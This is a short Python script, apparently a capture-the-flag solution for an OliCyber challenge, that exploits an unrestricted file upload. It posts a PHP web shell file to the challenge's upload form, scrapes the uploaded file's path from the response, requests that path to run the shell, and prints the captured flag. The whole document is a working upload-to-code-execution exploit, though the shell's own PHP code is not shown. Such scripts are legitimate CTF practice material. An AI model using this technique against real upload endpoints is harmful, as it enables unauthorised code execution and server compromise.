import requests
import re

URL = 'http://shellrevenge.challs.olicyber.it/'

def try_upload(field_name):
    with open("./ShellsRevenge.php", "rb") as f:
        files = {field_name: ("./ShellsRevenge.php", f)}
        data = {"submit": "Invia"}
        r = requests.post(URL, files=files, data=data)
    return r

r = try_upload('file')

m = re.search(r"/uploads/[A-Za-z0-9]+/ShellsRevenge\.php", r.text)
if m:
    link = m.group(0)

r = requests.get(URL+f'{link}')

flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])